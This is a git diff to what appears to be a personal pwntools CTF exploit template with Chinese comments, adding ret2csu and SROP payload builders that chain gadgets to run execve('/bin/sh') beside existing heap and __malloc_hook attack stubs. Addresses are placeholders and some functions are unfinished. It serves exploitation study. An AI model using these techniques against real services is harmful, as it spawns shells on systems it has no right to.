@@ -3,7 +3,6 @@ from re import L
 from pwn import *
 import sys
 from LibcSearcher import *
-from struct import pack
 
 context(os='linux', arch='amd64', log_level='debug')
 
@@ -461,6 +460,59 @@ def integetoverflow():
     r = remote('')
     r.sendline(b'-1')#根据实际情况而定
 
+def ret2csu():
+    #通过x64系统调用59对应的execve，在想办法执行execve("/bin/sh\x00",0,0)
+    #x32execve系统调用号为11
+    #rax = 59
+    #rdi = bin/sh
+    #rsi = 0
+    #rdx = 0  一共四个参数不可少
+    payload = b"string"
+    payload += b'a'*4     #x64为*8
+
+    #csu ： 控制寄存器赋值
+    #csu_end_addr = pop rbx/rbp/r12/r13/r14/15
+    #csu_beg_addr = mov rdx r13/mov rsi r14/mov edi r15d
+    #后csu继续 ： call ds:[r12+rbx*8]
+    #即csu_beg_addr 后返回到r12+rbx*8处
+
+    payload = 'string'
+    payload += p64(csu_end_addr)       #从rbx。。。赋值开始
+    payload += p64(0)+p64(1)+p64(binsh)
+    #payload += p64(0)+p64(1)+p64(pop_rdi_ret_addr)+p64(0)
+    payload += p64(0)+p64(0)+p64(0)    #由于后有比较，故第二个位1
+    payload += p64(csu_beg_addr)       #开始赋值
+    payload += p64(0)*7                #后面cus_end_addr会再运行一遍
+    payload += p64(mov_rax_59_addr)    #rax系统调用号
+    payload += p64(pop_rdi_ret_addr)   #对rdi进行赋值，赋的值位binsh的地址
+    payload += p64(binsh+0x8)
+    payload += p64(syscall_addr)       #系统调用
+
+    return
+
+def srop():
+
+    #当出现syscall且代码量段，可确定使用srop
+
+    #1. 需要知道栈的地址
+    #2. 需要知道syscall在内存中的地址 =》ROP
+    #3. 需要知道sigreturn系统调用的地址 =》将rax赋值为0xF(64位，32位位77)
+    frame = SigreturnFrame()         #伪造栈
+    frame.rax = constants.SYS_execve #对栈中的各个寄存器赋值
+    frame.rdi = binsh
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall_addr
+
+    payload = b'/bin/sh\x00'*2 #string+覆盖
+    payload += p64(rax_0xf_addr)+p64(syscall_addr)+bytes(frame)
+    #sigturn的系统调用号位0xf
+    #后进行系统调用，进入伪栈
+    #再进行伪栈中的函数
+
+    return
+
+
 def heapover():
     #利用思路：
     # 1. 在子线程中找到堆空间的地址
@@ -488,7 +540,6 @@ def off_by_one():
     #填充长度 = 要覆盖的地址 - 开始写入的地址
     def function():
         return
-      
 
 def fastbin_attack():
     #1.读取libc的基地址,从而获得malloc的地址,再进行劫持malloc__hook
@@ -515,8 +566,10 @@ def fastbin_attack():
     log.success('libc_base is {}'.format(hex(libc_base)))
     
     #2.
-  
- 
+
+
+    return
+
 def unsortedbin_attack():
     #1.通过free后的chunk的fd与bk，chunk->bk = ptr-0x10 伪造heap, 此题为easyheap
     create(0x68,'aaaa') # chunk 0
@@ -603,4 +656,8 @@ def __malloc_hook_attack():
     fill(6,len(payload),payload)
 
     allo(0x10)#此时为将malloc劫持为了system
+  
+ 
+  
+  
   
